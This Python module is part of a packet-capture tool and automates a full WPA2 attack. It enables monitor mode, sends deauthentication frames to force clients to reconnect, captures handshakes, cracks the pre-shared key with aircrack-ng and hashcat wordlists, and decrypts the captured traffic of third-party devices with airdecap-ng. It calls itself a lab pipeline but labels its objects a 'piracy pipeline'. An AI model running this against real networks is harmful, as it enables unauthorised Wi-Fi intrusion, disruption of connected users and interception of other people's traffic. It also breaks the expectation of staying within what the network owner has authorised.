from __future__ import annotations

import os
import shutil
import subprocess
import tempfile
import time
from pathlib import Path
from typing import Dict, List, Optional

from .config import resolve_wpa_password
from .environment import IS_MACOS, IS_WINDOWS, maybe_elevate_for_capture
from .ui import done, err, info, ok, section, warn


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run(cmd: List[str], cwd: Optional[str] = None, timeout: Optional[int] = None) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd,
        cwd=cwd,
        capture_output=True,
        text=True,
        check=False,
        timeout=timeout,
    )


def _require(tool: str) -> Optional[str]:
    path = shutil.which(tool)
    if not path:
        err(f"{tool} not found on PATH.")
    return path


# ---------------------------------------------------------------------------
# Monitor-mode helpers  (wi-fi lab pipeline — Linux, macOS)
# ---------------------------------------------------------------------------

class MonitorMode:
    """
    Wraps airmon-ng enable / disable.
    On Windows this is a no-op; the caller can still use a pre-configured
    monitor interface (e.g. a USB adapter set to monitor mode externally).
    """

    def __init__(self, interface: str) -> None:
        self.base_interface = interface
        self.monitor_interface: Optional[str] = None

    def enable(self) -> Optional[str]:
        """
        Put the card into monitor mode.
        Returns the monitor interface name (e.g. 'wlan0mon') or None on failure.
        """
        if IS_WINDOWS:
            warn("airmon-ng monitor mode is not available on Windows. "
                 "Configure a monitor-mode adapter externally.")
            self.monitor_interface = self.base_interface
            return self.base_interface

        airmon = _require("airmon-ng")
        if not airmon:
            return None

        # Kill interfering processes first
        _run(["airmon-ng", "check", "kill"])

        result = _run(["airmon-ng", "start", self.base_interface])
        # airmon-ng prints something like "monitor mode vif enabled for ... on wlan0mon"
        mon_iface = None
        for line in result.stdout.splitlines():
            if "monitor mode" in line.lower() and "enabled" in line.lower():
                # Try to extract interface name from the last token on the line
                parts = line.split()
                for part in reversed(parts):
                    if part.startswith("wlan") or part.startswith("mon"):
                        mon_iface = part.rstrip(")")
                        break
        if not mon_iface:
            # Fallback: conventional naming
            mon_iface = self.base_interface + "mon"

        if result.returncode != 0:
            err(f"airmon-ng failed: {result.stderr.strip() or result.stdout.strip()}")
            return None

        ok(f"Monitor mode enabled on {mon_iface}")
        self.monitor_interface = mon_iface
        return mon_iface

    def disable(self) -> None:
        if IS_WINDOWS or not self.monitor_interface:
            return
        airmon = shutil.which("airmon-ng")
        if airmon:
            _run(["airmon-ng", "stop", self.monitor_interface])
            ok(f"Monitor mode disabled on {self.monitor_interface}")


# ---------------------------------------------------------------------------
# Handshake capture (wi-fi lab pipeline steps 3 & 4)
# ---------------------------------------------------------------------------

class HandshakeCapture:
    """
    Captures a WPA2 4-way handshake using either besside-ng (automatic,
    handles deauth itself) or airodump-ng (targeted, channel + BSSID).

    Targets the configured AP BSSID and channel.
    """

    def __init__(self, config: Dict[str, object], output_dir: Path) -> None:
        self.config = config
        self.output_dir = output_dir
        self.handshake_path: Optional[Path] = None

    def capture_besside(self, mon_interface: str) -> Optional[str]:
        """
        besside-ng automatic handshake grabber.
        Targets only the configured BSSID/ESSID when provided, otherwise
        sweeps all reachable APs (lab use — make sure you own them all).
        """
        section("Handshake Capture — besside-ng")
        besside = _require("besside-ng")
        if not besside:
            return None

        bssid = str(self.config.get("ap_bssid") or "").strip()
        out_file = self.output_dir / "besside_handshakes.cap"
        duration = int(self.config.get("handshake_timeout", 120) or 120)

        cmd = ["besside-ng", "-W", str(out_file)]
        if bssid:
            cmd.extend(["-b", bssid])
        cmd.append(mon_interface)

        info(f"besside-ng running for up to {duration}s on {mon_interface} …")
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration, check=False)
        except subprocess.TimeoutExpired:
            info("besside-ng timeout reached — checking for handshakes.")

        if out_file.exists() and out_file.stat().st_size > 0:
            ok(f"Handshake capture saved to {out_file}")
            self.handshake_path = out_file
            return str(out_file)

        err("besside-ng produced no output.")
        return None

    def capture_airodump(self, mon_interface: str) -> Optional[str]:
        """
        airodump-ng targeted capture.
        Requires ap_bssid and ap_channel in config.
        """
        section("Handshake Capture — airodump-ng")
        airodump = _require("airodump-ng")
        if not airodump:
            return None

        bssid = str(self.config.get("ap_bssid") or "").strip()
        channel = str(self.config.get("ap_channel") or "").strip()
        if not bssid or not channel:
            err("ap_bssid and ap_channel must be set in config for airodump-ng capture.")
            return None

        prefix = str(self.output_dir / "airodump_hs")
        duration = int(self.config.get("handshake_timeout", 120) or 120)

        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "-c", channel,
            "-w", prefix,
            "--output-format", "pcap",
            mon_interface,
        ]
        info(f"airodump-ng targeting BSSID {bssid} ch{channel} for {duration}s …")

        # Optional deauth burst to speed up handshake (aireplay-ng --deauth)
        self._maybe_deauth(mon_interface, bssid)

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration, check=False)
        except subprocess.TimeoutExpired:
            info("airodump-ng timeout — checking for handshake file.")

        # airodump writes <prefix>-01.cap
        cap_file = Path(prefix + "-01.cap")
        if not cap_file.exists():
            # Try pcapng variant
            cap_file = Path(prefix + "-01.pcapng")
        if cap_file.exists() and cap_file.stat().st_size > 0:
            ok(f"airodump-ng capture saved to {cap_file}")
            self.handshake_path = cap_file
            return str(cap_file)

        err("airodump-ng produced no capture file.")
        return None

    def _maybe_deauth(self, mon_interface: str, bssid: str) -> None:
        """Send a small deauth burst to force client reconnect / handshake."""
        aireplay = shutil.which("aireplay-ng")
        if not aireplay:
            return
        deauth_count = int(self.config.get("deauth_count", 10) or 10)
        info(f"Sending {deauth_count} deauth frames to {bssid} …")
        subprocess.Popen(
            ["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid, mon_interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(3)  # brief pause so deauth lands before capture window


# ---------------------------------------------------------------------------
# WPA2 cracking (wi-fi lab pipeline steps 5 & 6)
# ---------------------------------------------------------------------------

class WPACracker:
    """
    Attempts to recover the WPA2 PSK from a captured handshake file.
    Tries aircrack-ng first (option {5}), then hashcat (option {6}).
    """

    def __init__(self, config: Dict[str, object]) -> None:
        self.config = config

    def crack_aircrack(self, handshake_cap: str) -> Optional[str]:
        """Option {5}: aircrack-ng dictionary attack."""
        section("WPA2 Crack — aircrack-ng")
        aircrack = _require("aircrack-ng")
        if not aircrack:
            return None

        wordlist = str(self.config.get("wordlist_path") or "").strip()
        if not wordlist or not Path(wordlist).exists():
            err("wordlist_path not configured or file not found. Cannot run aircrack-ng.")
            return None

        bssid = str(self.config.get("ap_bssid") or "").strip()
        cmd = ["aircrack-ng", "-w", wordlist]
        if bssid:
            cmd.extend(["-b", bssid])
        cmd.append(handshake_cap)

        info("Running aircrack-ng …")
        result = _run(cmd, timeout=int(self.config.get("crack_timeout", 600) or 600))

        for line in result.stdout.splitlines():
            if "KEY FOUND!" in line:
                # Line looks like:  KEY FOUND! [ password ]
                start = line.find("[")
                end = line.find("]")
                if start != -1 and end != -1:
                    psk = line[start + 1:end].strip()
                    ok(f"aircrack-ng recovered PSK: {psk}")
                    return psk

        warn("aircrack-ng did not find the key in the provided wordlist.")
        return None

    def crack_hashcat(self, handshake_cap: str) -> Optional[str]:
        """
        Option {6}: hashcat PMKID / HCCAPX attack.
        Requires hcxtools (cap2hccapx or hcxpcapngtool) to convert the capture.
        """
        section("WPA2 Crack — hashcat")
        hashcat = _require("hashcat")
        if not hashcat:
            return None

        wordlist = str(self.config.get("wordlist_path") or "").strip()
        if not wordlist or not Path(wordlist).exists():
            err("wordlist_path not configured or file not found. Cannot run hashcat.")
            return None

        # Convert .cap → .hccapx
        hccapx = self._convert_to_hccapx(handshake_cap)
        if not hccapx:
            return None

        potfile = str(Path(hccapx).with_suffix(".pot"))
        cmd = [
            "hashcat",
            "-m", "2500",       # WPA/WPA2
            "-a", "0",          # dictionary
            "--potfile-path", potfile,
            "--status",
            "--status-timer", "10",
            hccapx,
            wordlist,
        ]
        rules = str(self.config.get("hashcat_rules") or "").strip()
        if rules and Path(rules).exists():
            cmd.extend(["-r", rules])

        info("Running hashcat …")
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                check=False,
                timeout=int(self.config.get("crack_timeout", 600) or 600),
            )
        except subprocess.TimeoutExpired:
            info("hashcat timeout reached.")

        # Read potfile for recovered key
        pot = Path(potfile)
        if pot.exists() and pot.stat().st_size > 0:
            line = pot.read_text(encoding="utf-8", errors="replace").strip().splitlines()[-1]
            if ":" in line:
                psk = line.rsplit(":", 1)[-1].strip()
                ok(f"hashcat recovered PSK: {psk}")
                return psk

        warn("hashcat did not find the key.")
        return None

    def _convert_to_hccapx(self, cap_path: str) -> Optional[str]:
        """Convert a .cap file to .hccapx using cap2hccapx or hcxpcapngtool."""
        out = str(Path(cap_path).with_suffix(".hccapx"))

        for tool in ("cap2hccapx", "hcxpcapngtool"):
            binary = shutil.which(tool)
            if not binary:
                continue
            if tool == "cap2hccapx":
                cmd = [binary, cap_path, out]
            else:
                cmd = [binary, "-o", out, cap_path]
            result = _run(cmd)
            if Path(out).exists() and Path(out).stat().st_size > 0:
                ok(f"Converted capture to {out} via {tool}")
                return out

        err("Neither cap2hccapx nor hcxpcapngtool found. Install hcxtools.")
        return None

    def crack(self, handshake_cap: str) -> Optional[str]:
        """Try aircrack-ng first; fall back to hashcat."""
        psk = self.crack_aircrack(handshake_cap)
        if not psk:
            psk = self.crack_hashcat(handshake_cap)
        return psk


# ---------------------------------------------------------------------------
# Main Capture class (wi-fi lab pipeline integrated)
# ---------------------------------------------------------------------------

class Capture:
    def __init__(self, config: Dict[str, object]) -> None:
        self.config = config
        output_dir = Path(str(config.get("output_dir") or "./pipeline_output"))
        self.output_dir = output_dir
        self.raw_capture = output_dir / "raw_capture.pcapng"
        self.decrypted_capture = output_dir / "decrypted_wifi.pcapng"

        # Piracy-pipeline sub-objects
        self._monitor: Optional[MonitorMode] = None
        self._handshake: Optional[HandshakeCapture] = None
        self._cracker = WPACracker(config)

    # ------------------------------------------------------------------
    # Original helpers (unchanged)
    # ------------------------------------------------------------------

    def build_capture_filter(self) -> Optional[str]:
        macs = [item for item in self.config.get("target_macs", []) if item]
        if not macs:
            return None
        return " or ".join(f"ether host {mac}" for mac in macs)

    def _ensure_interface(self) -> Optional[str]:
        interface = str(self.config.get("interface") or "").strip()
        if not interface:
            err("No capture interface configured. Run the config command first.")
            return None
        return interface

    # ------------------------------------------------------------------
    # Standard Windows dumpcap capture (original, unchanged)
    # ------------------------------------------------------------------

    def run(self, interactive: bool = True) -> Optional[str]:
        """
        Standard pcap capture using dumpcap (cross-platform: Windows, Linux, macOS).
        Falls back to tcpdump when dumpcap is not available on Linux/macOS.
        """
        section("Stage 1 - Capture")
        if maybe_elevate_for_capture(interactive=interactive):
            return None

        dumpcap = shutil.which("dumpcap")
        if not dumpcap:
            if not IS_WINDOWS:
                info("dumpcap not found — falling back to tcpdump.")
                return self._run_tcpdump_capture()
            err("dumpcap not found. Install Wireshark with NPcap and add it to PATH.")
            return None

        interface = self._ensure_interface()
        if not interface:
            return None

        self.output_dir.mkdir(parents=True, exist_ok=True)
        capture_filter = self.build_capture_filter()
        duration = int(self.config.get("capture_duration", 60) or 0)

        cmd = [dumpcap, "-i", interface, "-w", str(self.raw_capture)]
        if capture_filter:
            cmd.extend(["-f", capture_filter])
        if duration > 0:
            cmd.extend(["-a", f"duration:{duration}"])

        info(f"Interface: {interface}")
        info(f"Filter: {capture_filter or '(none)'}")
        info(f"Output: {self.raw_capture}")

        result = subprocess.run(cmd, capture_output=True, text=True, check=False)
        if result.returncode != 0:
            stderr = result.stderr.strip() or result.stdout.strip()
            err(f"Capture failed: {stderr or 'unknown dumpcap error'}")
            return None

        if not self.raw_capture.exists() or self.raw_capture.stat().st_size == 0:
            err("Capture finished without writing a pcap.")
            return None

        ok(f"Capture saved to {self.raw_capture}")
        return str(self.raw_capture)

    def _run_tcpdump_capture(self) -> Optional[str]:
        """
        Fallback capture using tcpdump (Linux / macOS) when dumpcap is absent.
        Writes a standard pcap to the same raw_capture path.
        """
        tcpdump = _require("tcpdump")
        if not tcpdump:
            err("Neither dumpcap nor tcpdump found. Install Wireshark or tcpdump.")
            return None

        interface = self._ensure_interface()
        if not interface:
            return None

        self.output_dir.mkdir(parents=True, exist_ok=True)
        capture_filter = self.build_capture_filter()
        duration = int(self.config.get("capture_duration", 60) or 0)

        cmd = ["tcpdump", "-i", interface, "-w", str(self.raw_capture)]
        if capture_filter:
            cmd.extend(["-f", capture_filter])
        if duration > 0:
            cmd.extend(["-G", str(duration), "-W", "1"])

        info(f"Interface : {interface}")
        info(f"Filter    : {capture_filter or '(none)'}")
        info(f"Output    : {self.raw_capture}")
        info(f"Duration  : {duration}s" if duration else "Duration  : manual stop (Ctrl-C)")

        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=(duration + 5) if duration else None, check=False)
        except subprocess.TimeoutExpired:
            pass

        if not self.raw_capture.exists() or self.raw_capture.stat().st_size == 0:
            err("tcpdump finished without writing a pcap.")
            return None

        ok(f"Capture saved to {self.raw_capture}")
        return str(self.raw_capture)

    def run_monitor(
        self,
        method: str = "airodump",   # "airodump" | "besside" | "tcpdump"
    ) -> Optional[str]:
        """
        Full wi-fi lab pipeline:
          1. Enable monitor mode  (airmon-ng)
          2. Capture raw 802.11 frames including frames from third-party clients
             that would be invisible to a normal Windows managed-mode capture.
          3. Return path to the raw .cap file.

        `method` choices:
          "airodump"  — targeted (needs ap_bssid + ap_channel in config)
          "besside"   — automatic sweep / single AP
          "tcpdump"   — generic monitor-mode dump via tcpdump (no WPA targeting)
        """
        section("Stage 1 - Monitor-Mode Capture")

        if IS_WINDOWS:
            err("Monitor-mode capture requires Linux/Kali or macOS. Use run() for Windows.")
            return None

        if IS_MACOS:
            # macOS: tcpdump -I puts the interface into monitor mode natively
            interface = self._ensure_interface()
            if not interface:
                return None
            self.output_dir.mkdir(parents=True, exist_ok=True)
            return self._run_tcpdump_monitor_macos(interface)

        interface = self._ensure_interface()
        if not interface:
            return None

        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Step 1 — enable monitor mode
        self._monitor = MonitorMode(interface)
        mon_iface = self._monitor.enable()
        if not mon_iface:
            return None

        # Step 2 — capture
        self._handshake = HandshakeCapture(self.config, self.output_dir)
        cap_path: Optional[str] = None

        if method == "besside":
            cap_path = self._handshake.capture_besside(mon_iface)
        elif method == "airodump":
            cap_path = self._handshake.capture_airodump(mon_iface)
        elif method == "tcpdump":
            cap_path = self._run_tcpdump_monitor(mon_iface)
        else:
            err(f"Unknown monitor capture method: {method}")

        if not cap_path:
            self._monitor.disable()
            return None

        ok(f"Raw 802.11 capture: {cap_path}")
        return cap_path

    def _run_tcpdump_monitor(self, mon_iface: str) -> Optional[str]:
        """
        Simple tcpdump capture on the monitor interface.
        Captures ALL 802.11 frames visible on the air including traffic
        from third-party devices — the traffic that is invisible to a
        normal Windows managed-mode capture.
        """
        tcpdump = _require("tcpdump")
        if not tcpdump:
            return None

        out = self.output_dir / "monitor_raw.pcap"
        duration = int(self.config.get("capture_duration", 60) or 60)
        cmd = ["tcpdump", "-i", mon_iface, "-w", str(out), "-G", str(duration), "-W", "1"]

        info(f"tcpdump on {mon_iface} for {duration}s …")
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=duration + 5, check=False)
        except subprocess.TimeoutExpired:
            pass

        if out.exists() and out.stat().st_size > 0:
            return str(out)
        err("tcpdump produced no output.")
        return None

    def _run_tcpdump_monitor_macos(self, interface: str) -> Optional[str]:
        """
        macOS monitor-mode capture: tcpdump -I puts the adapter into monitor mode.
        Requires root and a Wi-Fi interface (e.g. en0).
        """
        tcpdump = _require("tcpdump")
        if not tcpdump:
            return None

        out = self.output_dir / "monitor_raw.pcap"
        duration = int(self.config.get("capture_duration", 60) or 60)
        cmd = ["tcpdump", "-I", "-i", interface, "-w", str(out)]
        if duration > 0:
            cmd.extend(["-G", str(duration), "-W", "1"])

        info(f"tcpdump monitor mode (-I) on {interface} for {duration}s …")
        try:
            subprocess.run(cmd, capture_output=True, text=True,
                           timeout=duration + 5, check=False)
        except subprocess.TimeoutExpired:
            pass

        if out.exists() and out.stat().st_size > 0:
            ok(f"Monitor capture saved to {out}")
            return str(out)
        err("tcpdump -I produced no output. Ensure you are root and the interface supports monitor mode.")
        return None

    def disable_monitor(self) -> None:
        """Put the card back into managed mode."""
        if self._monitor:
            self._monitor.disable()

    # ------------------------------------------------------------------
    # WPA2 crack + airdecap pipeline (lab steps 5/6 → airdecap-ng)
    # ------------------------------------------------------------------

    def crack_and_decrypt(self, handshake_cap: Optional[str] = None) -> Optional[str]:
        """
        1. If no handshake_cap supplied, tries the last captured one.
        2. Cracks the PSK via aircrack-ng then hashcat.
        3. Stores the recovered PSK in config so strip_wifi_layer can use it.
        4. Calls strip_wifi_layer on the raw capture.
        Returns the path to the decrypted pcap, or None on failure.
        """
        section("WPA2 Crack + Decrypt")

        cap = handshake_cap
        if not cap and self._handshake and self._handshake.handshake_path:
            cap = str(self._handshake.handshake_path)
        if not cap:
            # Last resort: look for any .cap file in output dir
            caps = list(self.output_dir.glob("*.cap"))
            if caps:
                cap = str(max(caps, key=lambda p: p.stat().st_mtime))
        if not cap:
            err("No handshake capture file available. Run run_monitor() first.")
            return None

        psk = resolve_wpa_password(self.config)
        if not psk:
            info("No PSK in config — attempting to crack handshake …")
            psk = self._cracker.crack(cap)
            if psk:
                # Inject recovered key back into config for airdecap-ng
                self.config["wpa_password"] = psk
            else:
                err("Could not recover WPA2 PSK. Decryption not possible.")
                return None
        else:
            ok(f"Using pre-configured PSK.")

        return self.strip_wifi_layer(pcap_path=cap)

    # ------------------------------------------------------------------
    # airdecap-ng step (original, unchanged)
    # ------------------------------------------------------------------

    def strip_wifi_layer(self, pcap_path: Optional[str] = None) -> Optional[str]:
        section("Stage 1b - Wi-Fi Layer Strip")
        source = Path(pcap_path or self.raw_capture)
        if not source.exists():
            err(f"Input capture not found: {source}")
            return None

        airdecap = shutil.which("airdecap-ng")
        if not airdecap:
            warn("airdecap-ng not found. Skipping Wi-Fi decryption step.")
            return str(source)

        essid = str(self.config.get("ap_essid") or "").strip()
        password = resolve_wpa_password(self.config)
        if not essid or not password:
            warn("ESSID or WPA password missing. Skipping Wi-Fi decryption step.")
            return str(source)

        info("Running airdecap-ng with the configured ESSID and WPA password.")
        output_dir = source.parent
        result = subprocess.run(
            [airdecap, "-e", essid, "-p", password, str(source)],
            cwd=str(output_dir),
            capture_output=True,
            text=True,
            check=False,
        )
        generated = source.with_name(source.stem + "-dec.pcapng")
        if not generated.exists():
            generated = source.with_name(source.stem + "-dec.pcap")
        if not generated.exists():
            warn(result.stdout.strip() or "airdecap-ng produced no output. Using the original pcap.")
            return str(source)

        if self.decrypted_capture.exists():
            self.decrypted_capture.unlink()
        generated.replace(self.decrypted_capture)
        done(f"Wi-Fi decrypted capture saved to {self.decrypted_capture}")
        return str(self.decrypted_capture)

    # ------------------------------------------------------------------
    # Convenience: full end-to-end wi-fi lab pipeline in one call
    # ------------------------------------------------------------------

    def run_full_wifi_pipeline(self, method: str = "airodump") -> Optional[str]:
        """
        Convenience wrapper that runs the complete pipeline:
          enable monitor → capture → crack PSK → airdecap-ng → return decrypted pcap

        After this returns, pass the result into StreamExtractor.extract()
        and it will now see all IPv6, ICMP, SCTP, and third-party traffic
        because the Wi-Fi encryption has been stripped.
        """
        cap = self.run_monitor(method=method)
        if not cap:
            self.disable_monitor()
            return None
        decrypted = self.crack_and_decrypt(handshake_cap=cap)
        self.disable_monitor()
        return decrypted